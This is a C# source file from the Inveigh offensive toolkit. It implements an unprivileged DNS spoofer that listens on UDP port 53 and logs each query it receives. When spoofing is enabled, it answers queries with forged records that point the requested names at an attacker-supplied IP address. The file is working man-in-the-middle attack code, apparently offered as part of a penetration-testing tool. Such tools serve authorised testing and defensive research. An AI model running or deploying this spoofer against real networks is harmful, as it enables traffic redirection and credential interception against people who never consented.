using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class DNS
    {

        public static void DNSListener(string IP, string spooferIP, string dnsTTL)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] ttlDNS = BitConverter.GetBytes(Int32.Parse(dnsTTL));
            Array.Reverse(ttlDNS);
            IPEndPoint dnsEndpoint = new IPEndPoint(IPAddress.Any, 53);
            UdpClient dnsClient = new UdpClient();

            try
            {
                dnsClient.ExclusiveAddressUse = false;
                dnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                dnsClient.Client.Bind(dnsEndpoint);
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting unprivileged DNS spoofer, UDP port sharing does not work on all versions of Windows.", DateTime.Now.ToString("s")));
                }

                throw;
            }

            while (!Program.exitInveigh)
            {

                try
                {
                    string dnsResponseMessage = "";
                    byte[] udpPayload = dnsClient.Receive(ref dnsEndpoint);
                    int dnsSourcePort = dnsEndpoint.Port;
                    byte[] dnsTransactionID = new byte[2];
                    System.Buffer.BlockCopy(udpPayload, 0, dnsTransactionID, 0, 2);              
                    string dnsRequestHost = Util.ParseNameQuery(12, udpPayload);
                    byte[] dnsRequest = new byte[dnsRequestHost.Length + 2];
                    System.Buffer.BlockCopy(udpPayload, 12, dnsRequest, 0, dnsRequest.Length);
                    int udpResponseLength = dnsRequest.Length + dnsRequest.Length + spooferIP.Length + 27;
                    IPAddress sourceIPAddress = dnsEndpoint.Address;
                    dnsResponseMessage = Util.CheckRequest(dnsRequestHost, sourceIPAddress.ToString(), IP.ToString(), "DNS");

                    if (Program.enabledDNS && String.Equals(dnsResponseMessage, "response sent"))
                    {

                        using (MemoryStream ms = new MemoryStream())
                        {
                            ms.Write(dnsTransactionID, 0, dnsTransactionID.Length);
                            ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                            ms.Write(dnsRequest, 0, dnsRequest.Length);
                            ms.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                            ms.Write(dnsRequest, 0, dnsRequest.Length);
                            ms.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                            ms.Write(ttlDNS, 0, 4);
                            ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                            ms.Write(spooferIPData, 0, spooferIPData.Length);
                            IPEndPoint dnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, dnsSourcePort);
                            dnsClient.Connect(dnsDestinationEndPoint);
                            dnsClient.Send(ms.ToArray(), ms.ToArray().Length);
                            dnsClient.Close();
                            dnsEndpoint = new IPEndPoint(IPAddress.Any, 53);
                            dnsClient = new UdpClient();
                            dnsClient.ExclusiveAddressUse = false;
                            dnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                            dnsClient.Client.Bind(dnsEndpoint);
                        }

                    }

                    lock (Program.outputList)
                    {
                        Program.outputList.Add(String.Format("[+] [{0}] DNS request for {1} received from {2} [{3}]", DateTime.Now.ToString("s"), dnsRequestHost, sourceIPAddress, dnsResponseMessage));
                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] DNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

    }
}
